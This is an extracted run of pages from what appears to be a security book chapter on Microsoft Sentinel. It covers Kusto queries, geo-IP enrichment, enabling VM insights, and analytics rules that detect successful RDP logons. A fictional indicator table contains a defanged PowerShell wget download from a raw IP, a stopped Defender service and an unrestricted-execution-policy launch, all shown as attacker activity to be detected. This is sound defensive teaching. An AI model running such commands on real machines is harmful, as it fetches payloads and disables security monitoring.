- pgno: 99
  md: '# Performing Kusto and log queries


    Sentinel stores data in a workspace, which is a database, and we can analyze this
    data using a query language called Kusto, which is a read-only SQL query language.


    Kusto has a simple syntax; you define which data source and filters you want to
    apply to the search and where you can apply different filters to include or exclude
    certain attributes. depending on the data source.


    So far, we have collected data in the SecurityEvents table, which contains the
    attributes listed here: https://docs.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityevent.
    It should be noted that for each table, different attributes will be available.
    The available data depends on what kind of data connectors have been enabled and
    configured.


    > **Note**

    > By default, all the data that is stored in the workspace is set to read-only,
    so you cannot delete data from the workspace using the UI. However, there is a
    Purge API that allows you to delete certain entries in the workspace. You can
    read more about how you use the API here: https://docs.microsoft.com/en-us/rest/api/loganalytics/workspace-purge/purge.


    If we wanted to look for a certain Event ID in the Security Events table, we could
    use the following query:


    ```

    SecurityEvent

    | where EventID == 4625

    ```


    This will list all events that contain the specific Event ID. We can also customize
    the query more to look at a specific time range. I can just append this filter
    to look within a specific time range:


    ```

    | where TimeGenerated > datetime(2022-03-10) and TimeGenerated < datetime(2022-03-12)

    ```


    Kusto provides a lot of different features in terms of adding selectors that allow
    you to filter data in the result or add external data sources to enrich the datasets.
    You can also find a lot more examples of Kusto operators and queries related to
    this book here: https://github.com/PacktPublishing/Windows-Ransomware-Detection-and-Protection/tree/main/chapter3.


    If you want to learn more about how you can use Kusto, you can learn more about
    it here: https://docs.microsoft.com/en-us/azure/sentinel/kusto-overview.


    It is important to understand that when we build analytics rules, scheduled Kusto
    queries look for a certain activity within a certain time. We must also determine
    how many results of that query will need to happen before it generates an alert
    in Sentinel.'
  merge: -1
  img_proc: true
- pgno: 100
  md: "Therefore, much of the work in Sentinel involves building good Kusto queries\
    \ that will be used to run analytics rules. The more adept you are with Kusto,\
    \ the more powerful Sentinel will be in terms of looking for abnormal behavior\
    \ in the data.\n\nHowever, I wanted to show some example queries here to give\
    \ you some insight into the features and how you can use different filters and\
    \ use external data to enrich the dataset.\n\nBy default, Kusto does not enhance\
    \ the data sources that are collected; so, for instance, the SecurityEvents tables\
    \ do not contain any information related to the country. If we have a VM that\
    \ is constantly being brute-forced and we wanted to determine where the attacking\
    \ IP address is located, we can use an external IP source:\n\n```\nlet geoData\
    \ = externaldata\n(network:string,geoname_id:string,continent_code:string,continent_name:string,\n\
    \  country_iso_code:string,country_name:string,is_anonymous_proxy:string,is_satellite_provider:string)\n\
    [@\"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv\"\
    ] with (ignoreFirstRecord=true, format=\"csv\");\nSecurityEvent\n| where EventID\
    \ == \"4625\"\n| evaluate ipv4_lookup (geoData, IpAddress, network, false)\n|\
    \ summarize count() by IpAddress, country_name\n```\n\nThis example query starts\
    \ with defining a variable that will contain different attributes such as the\
    \ network, geoname, country code, and more. Then, it performs an external call\
    \ to an HTTPS endpoint and collects a CSV file, which is then mapped into the\
    \ attributes.\n\nThen, we look up the SecurityEvent table, where we look for an\
    \ event ID of 4625, which is the event ID that is generated when someone fails\
    \ to log on. Then, we use an evaluate operator called ipv4_lookup, where we map\
    \ the IP address and geodata in the CSV’s source location against the IpAddress\
    \ attribute in the SecurityEvent table and see whether we have a match.\n\nMicrosoft\
    \ has also launched a new interactive way to learn Kusto called Kusto Detective\
    \ Agency, which provides you with predefined use cases that allow you to learn\
    \ Kusto. You can find it here: https://detective.kusto.io/.\n\nThen, we use the\
    \ summarized operator to get a total count of logon attempts, as seen in the following\
    \ example screenshot:"
  merge: -1
  img_proc: true
- pgno: 101
  md: '```

    let geoData = externaldata

    (network: string, geoname_id: string, continent_code: string, continent_name:
    string,

    country_iso_code: string, country_name: string, is_anonymous_proxy: string,

    is_satellite_provider: string)

    [@"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv"]

    with (ignoreFirstRecord=true, format="csv");

    SecurityEvent

    | where EventID == "4625"

    | evaluate ipv4_lookup (geoData, IPAddress, network, false)

    | summarize count() by IPAddress, country_name

    | render piechart

    ```


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_101_0.png)


    Figure 3.11 – Geo lookup of login attempts in Microsoft Sentinel


    Now, let us look at how we see the whole picture by using different data sources
    with Microsoft Sentinel and Microsoft Defender for Servers.


    # Seeing the full picture


    As explained in Chapter 1, Ransomware Attacks and the Threat Landscape, during
    a ransomware attack or an initial assessment, a ransomware operator might use
    many different tools and scripts on a compromised endpoint or service to try and
    gain further access.


    While looking through security events for abnormal login traffic, you will not
    get enough data to get a full overview of what is going on.


    For instance, the SecurityEvent table contains information related to login attempts
    with the account name and IP address. However, it does not contain any information
    related to the process that made the call or what kind of port the attempt came
    from; second, it does not contain any information'
  merge: -1
  img_proc: true
- pgno: 102
  md: 'related to what happened after someone gained access, for instance, whether
    they run any commands, scripts, or executables on the machine.


    To get a full overview, we need multiple different data sources to be able to
    detect attacks earlier, make it easier to do threat hunting, and determine normal
    behavior or patterns.


    For instance, this security event alone only tells us that someone has successfully
    logged on:


    # Event ID: 4624 – IP Address 80.66.76.145 – An account was successfully logged
    on


    However, if we use multiple data sources, we can see the whole series of events
    that were run in the same period from that IP address.


    The information in the following table has been collected from different data
    sources: the VM connection is coming from VM insights, which requires Azure Monitor
    Agent to be installed; the dependency agent requires some additional configuration
    to be collected. Then, we have security events that are coming from the data connector
    that we previously configured. Also, for devices that are configured with Microsoft
    Defender for Servers, we have device file events. This table contains information
    about all running processes and files that have been downloaded on a machine.
    This is useful to see whether, for instance, someone has been running a script
    locally on the machine. Lastly, we have a configuration change that is coming
    from the Change Tracking feature. This is useful for detecting changes to the
    registry, files, or services on a Windows machine.


    Data that is collected is stored in different tables and contains different data.
    You can learn more about what data is collected here: https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/tables-category.


    The following information is fictional, but it shows the value of having the different
    data collected to be able to see everything that''s happening:


    | Source | VM Connection | Security Events | Device File Events | Configuration
    Change | Device Process Events |

    |---|---|---|---|---|---|

    | Activity | 80.66.76.145

    Inbound

    3389

    svchost

    Russia | 80.66.76.145

    4624 - An account was successfully logged on. | PowerShell wget hxxp://209.14.0[.]234:46613/VcEt
    rKighyIFS5foGNXH -file *.zip | Service

    Stopped

    MsSenseS | powershell.exe

    ExecutionPolicy

    Unrestricted

    Noninteractive |


    Figure 3.12 – Data overview from Sentinel log sources'
  merge: -1
  img_proc: true
- pgno: 103
  md: 'To get this view, we need to enable other data sources that will be collected
    in Microsoft Sentinel as well:


    +   - **VM Connection:** This provides insight into network connections. Mapping
    it to a running process on a machine can also show whether traffic was initiated
    outbound or inbound. This requires enabling the VM insights extension.

    +   - **Device File Events:** This requires integration with Microsoft Defender
    for Servers and having the agent installed.

    +   - **Configuration Change:** This requires integration with Azure Automation,
    which can monitor changes to the registry, processes, and even files.

    +   - **Device Process Events:** This requires integration with Microsoft Defender
    for Servers and having the agent installed.


    We will come back to Microsoft Defender later in the *Detecting vulnerabilities
    with Defender* section; however, we can take a closer look at how we can enable
    the VM insights extension on our Azure Arc VM.


    Enabling VM insights can be done using PowerShell, Azure Policy, or the Azure
    portal. For simplicity, we will be using PowerShell.


    This can be done by installing a dependency agent on the machine. This dependency
    agent will inherit all the configuration from the existing Monitor Agent, so you
    just need to install the agent and it will start to collect the data:


    ```

    Invoke-WebRequest "https://aka.ms/dependencyagentwindows"

    -OutFile InstallDependencyAgent-Windows.exe

    .\InstallDependencyAgent-Windows.exe /S

    ```


    It should be noted that enabling VM insights will generate a lot of log data,
    depending on how much traffic is going in and out of the machine. Enable it with
    caution since it can generate a high cost for Log Analytics.


    Once the agent has been installed, after a couple of minutes, you will see some
    new tables being generated in the Sentinel workspace, such as VMComputer, VMConnection,
    and VMProcess. You can also see an overview by going to **Insights** under the
    **Monitoring** pane as shown in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_103_0.png)


    Figure 3.13 – Enabling VM insights for an Azure Arc machine'
  merge: -1
  img_proc: true
- pgno: 104
  md: 'A simple way to use this data is to look after incoming connections to a VM.
    Go into the Azure portal, then Microsoft Sentinel, and click on Logs. There, double-click
    on the VMConnection table and type the following Kusto query:


    ```

    VMConnection

    | where Direction == "inbound"

    | summarize count() by DestinationPort

    ```


    This is a simple query that will look into the dataset and look after incoming
    connections and summaries based on the incoming port.


    With that, we have taken a closer look at extending logging capabilities to get
    more insight into the traffic flow going into a VM. Now, let us take the next
    step and look at using info-building analytics rules to trigger an incident or
    alert in Microsoft Sentinel.


    # Creating analytics rules and handling incidents


    Now that the data sources are being collected in Sentinel, we need to define some
    logic to look after abnormal patterns that, if found, will generate an incident.


    In Microsoft Sentinel, incidents are created based on analytics rules. These rules
    can be divided into three different types:


    +   - Scheduled query rules

    +   - Microsoft incident creation rules (Security Graph API)

    +   - Anomaly rules


    If we create a scheduled query rule, we need to define a Kusto query that will
    run on a predefined schedule. Also, within the query, we must define a threshold
    if there is a match with the Kusto query; if the threshold is met, it will generate
    an incident.


    We also have Microsoft incident creation rules, which are alerts that come from
    other Microsoft security products through the Security Graph API. These can be
    alerts from Azure AD Identity Protection, Microsoft Defender for Cloud, Microsoft
    Defender for Endpoint, Defender for Identity, and so on, which will then be automatically
    created in Sentinel as well.


    The last one is anomaly-based query rules, which are based on machine learning
    algorithms. Our focus here will be based on scheduled query rules, where we need
    to define our custom logic.'
  merge: -1
  img_proc: true
- pgno: 105
  md: 'Once an analytics rule triggers, it can also be used to trigger automation
    rules, which are based on Logic Apps in Microsoft Azure:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_105_0.png)


    Figure 3.14 – Overview of analytics rules in Microsoft Sentinel


    Before we start building analytics rules, there is also one final concept that
    we need to understand, which is entities. With Sentinel, you can ingest data from
    many different sources. When working with all the different types of data, some
    information will be the same across the different sources but be presented as
    different attributes.


    Let me share an example. As seen in the following screenshot, we have two different
    tables. One is SecurityEvents, which collects information from the security log
    from the Windows event engine. That log source collects information such as failed
    logon attempts and will also collect the IP address of the host that tried to
    log on under the IpAddress attribute. Then, we have the VMConnection data source,
    which also collects much of the same but looks at the traffic from a process view.
    This data source also collects information related to the IP address that tried
    to connect but that is stored under the SourceIP attribute:'
  merge: -1
  img_proc: true
- pgno: 106
  md: '![](img/7b49a27a3c2adc52d097f2e77f3bf394_106_0.png)


    Figure 3.15 – Entity matching in Microsoft Sentinel


    Microsoft Sentinel uses entities to match data they recognize and classify it
    into the same incident, for instance, and into entity history. For this example,
    both the IpAddress and SourceIp data items should be matched into the same entity
    in Sentinel – that is, Host


    Entities are used as a reference point for incidents and allow you to look into
    entity history when working with incidents in Sentinel.


    Microsoft supports a wide range of different entities that you can use; more information
    can be found here: https://docs.microsoft.com/en-us/azure/sentinel/entities.


    These entities can also be easily referenced within the Entity behavior dashboard,
    where you can look up the history of entities, such as IPs, hostnames, and usernames,
    as seen in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_106_1.png)


    Figure 3.16 – Entity dashboard in Microsoft Sentinel'
  merge: -1
  img_proc: true
- pgno: 107
  md: 'With the ability to track entities such as IP addresses or users that have
    been previously linked to security alerts, we can gain insight into potential
    security risks. Now that we have an understanding of how data is gathered and
    saved, we can establish monitoring guidelines.


    # Analytics rules


    Let us start by looking at building our own analytics rules. For the example here,
    I will be using the Azure portal and will provide a PowerShell example at the
    end.


    As mentioned in Chapter 1, Ransomware Attack Vectors and the Threat Landscape,
    a typical entry point for ransomware attacks can be based upon RDP connections.
    I want to create two different analytics rules that will use two data sources
    to look at signs of compromise from a fictional machine that is publicly available
    on the internet using RDP:


    +   - Security events (collected from DCRs in Azure Monitor)

    +   - VM insights (collected from the dependency agent)


    For the sake of this example, we will look for connection attempts where RDP has
    been successful and create an alert rule based on that. We will also exclude known
    IP addresses so that alert rules are not created for known traffic.


    Start by going into the Azure portal, then Microsoft Sentinel, and then into the
    Analytics pane. From there, click Create Scheduled Query Rule, which will initiate
    the wizard.


    Then, enter the following information in the first part of the wizard:


    +   - **Name:** Successful Logon RDP - Security Events

    +   - **Description:** Looking for signs of compromise where someone has successfully
    logged onto a machine with RDP

    +   - **Tactics and techniques:** Initial Access (T1078) and Brute Force (T1110)

    +   - **Severity:** Medium

    +   - **Status:** Enabled


    This information can be seen in the following screenshot:'
  merge: -1
  img_proc: true
- pgno: 108
  md: '# Analytics rule wizard - Create a new scheduled rule


    Home > Microsoft Sentinel > Microsoft Sentinel >


    General   Set rule logic   Incident settings   Automated response   Review and
    create


    Create an analytics rule that will run on your data to detect threats.


    # Analytics rule details


    Name *

    Successful Logon RDP - Security Events


    Description

    Looking for signs of compromise where someone has successfully logged onto a machine
    with RDP


    Tactics and techniques

    2 selected


    Severity

    Medium


    Status

    Enabled Disabled


    Figure 3.17 – Analytics rule wizard in Microsoft Sentinel


    The tactics and techniques are mapped to the MITRE framework, which you can read
    more about here: https://attack.mitre.org/techniques/T1021/001/. Microsoft has
    a detailed reference sheet regarding Event ID that contains different descriptions:
    https://www.microsoft.com/en-us/download/details.aspx?id=52630.


    Then, click Next to be taken to the Set rule logic tab of the wizard. Here, we
    need to enter a Kusto query to determine what we are looking for. The Kusto query
    logic is built up like this: we start with a subnet that we want to exclude, which
    we define in a variable called subnets. Then, we look inside the SecurityEvents
    table and look for event ID 4624, which will look for successful logon attempts.
    In addition, we will evaluate IP addresses to exclude the known IP ranges and
    lastly filter only on the 3 logon type, which indicates network-based login.


    The following code shows the example Kusto query that will be entered in this
    rule logic part of the wizard:


    ```

    let subnets = datatable(network:string) [ "8.8.8.8"];

    SecurityEvent

    | where EventID == 4624

    | evaluate ipv4_lookup(subnets, IpAddress, network, return_

    ```'
  merge: -1
  img_proc: true
- pgno: 109
  md: '```

    unmatched = true)

    | where isempty(network)

    | where LogonTypeName == "3 - Network"

    ```


    As part of the wizard, you can also click on **View query results** to see whether
    any existing events will match the query.


    Next, we need to map attributes from the data source to entities, where we want
    to map two different entities called **IP** and **Account**. Here, **IP** will
    be mapped to `IpAddress` and **Account** will be mapped to `AccountName`, as seen
    in the following screenshot:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_109_0.png)


    Figure 3.18 – Entity matching in analytics rules


    Then, under **Query scheduling**, we need to define how often these queries should
    run to check the data lookup. By default, it is set to 5 hours, which means that
    the query will be run every 5 hours, which might already be too late. Since we
    are looking for successful logon attempts with this query, we should be looking
    at using as many real-time frequencies as possible.


    The lowest possible interval is 5 minutes; however, lower intervals down to 1
    minute are something that is in public preview at the time of writing.


    To account for ingestion delay, Microsoft Sentinel runs scheduled analytics rules
    on a 5-minute delay from their scheduled time.


    It should be noted that because of ingestion delay, you should always define the
    lookback period as longer than how often the query is run. There should be at
    least a 2-minute overlap between the scheduled query and the lookup data. This
    means that if you run the query every 5 minutes, you should have at least 7 minutes
    of lookup time. However, there is no additional cost to having queries looking
    up for a longer period, such as 1 hour or 1 day.


    The final part is defining the threshold. In this example, we want an alert for
    when 1 entry is created, so the setting here is going to be **Is greater than
    0**.'
  merge: -1
  img_proc: true
- pgno: 110
  md: 'Then, we can just continue through the wizard to the end and click Create.
    Now, we must go back to the main Sentinel dashboard, click on the Analytics pane,
    and go to Active rules. The newly created rule should be visible there.


    We can also create a similar analytics query rule but use another data source
    where we will look for active RDP traffic to the machine. We will use the same
    logic as before and exclude known IP ranges. The complete Kusto query will look
    like this:


    ```

    let subnets = datatable(network:string) [ "81.166.4.107" ];

    VMConnection

    | where BytesSent > 200000

    | where DestinationPort == 3389

    | evaluate ipv4_lookup(subnets, SourceIp, network, return_unmatched = true)

    | where isempty(network)

    ```


    The only additional information here is bytes sent, which needs to be higher than
    200 KB; an average RDP attempt is between 100 and 120 KB. Second, we need to change
    ipv4_lookup so that it uses the SourceIp attribute instead since that is the attribute
    that is used in this data source. We also need to change the entity type when
    we define the IP address so that it matches SourceIp.


    The rest you can leave the same as you did for the other analytics rule; just
    remember to change the name to, for instance, Successful Logon RDP - VM Insight.


    For this example, I wanted to show what it looks like if someone managed to gain
    access to RDP and generated an event in both those analytics rules.


    First, we will have incidents that will be created if there is a match, as seen
    in the Incidents pane of Sentinel:


    ![](img/7b49a27a3c2adc52d097f2e77f3bf394_110_0.png)


    Figure 3.19 – The Incidents view in Sentinel'
  merge: -1
  img_proc: true
